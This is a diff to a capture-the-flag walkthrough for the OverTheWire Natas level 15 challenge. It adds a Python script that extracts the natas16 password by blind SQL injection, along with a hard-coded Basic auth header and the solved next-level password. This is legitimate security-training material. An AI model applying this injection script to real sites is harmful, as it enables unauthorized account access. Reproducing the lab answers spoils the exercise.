@@ -25,10 +25,39 @@ Username: `natas16" and password like "________________________________";#`
 Now we will compile a script that Brute Force the password, character by character:
 
 ```python
+from requests import post
+from string import digits, ascii_letters
 
+URL = "http://natas15.natas.labs.overthewire.org/index.php"
+
+# After looking at the sent packet and some trial and error, these are the essential headers:
+HEADERS ={}
+HEADERS["Authorization"] = \
+"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="
+HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
+
+# The template for the blind sql injection
+DATA = "username=natas16\" and password like \"________________________________\";#"
+
+password = ""
+
+while(len(password) < 32):
+    index = DATA.find("_")
+    for char in digits + ascii_letters:
+        DATA = DATA[:index] + char + DATA[index+1:]
+        response = post(url=URL, headers=HEADERS, data=DATA)
+        if "This user exists" in response.text:
+            password += char
+            print("password: "+ password.ljust(32, "_"))
+            break
 ```
+
+Output is:
+
+<img src="./6.png"></img>
+
 
 ## Password for the next level:
 ```
-
+trd7izrd5gatjj9pkpeuaolfejhqj32v
 ```
